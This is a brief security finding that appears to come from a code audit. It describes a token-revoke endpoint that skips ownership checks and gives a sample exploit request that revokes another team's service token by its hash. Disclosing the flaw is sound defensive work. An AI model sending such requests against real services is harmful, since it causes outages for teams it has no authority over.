diagnosis: The view accepts a token_hash and deletes the corresponding CustomServiceToken without verifying that the token belongs to request.user or their organization team. An attacker can revoke active service tokens utilized by production microservices or data ingestion pipelines belonging to other teams, inducing selective outages.
exploit_request:
POST /api/auth/service-tokens/revoke/ HTTP/1.1
Host: iam.microservices.local
Authorization: Token <attacker_service_token>
Content-Type: application/json

{"token_hash": "e84b9101ffc3a8849019b882190ad01e"}
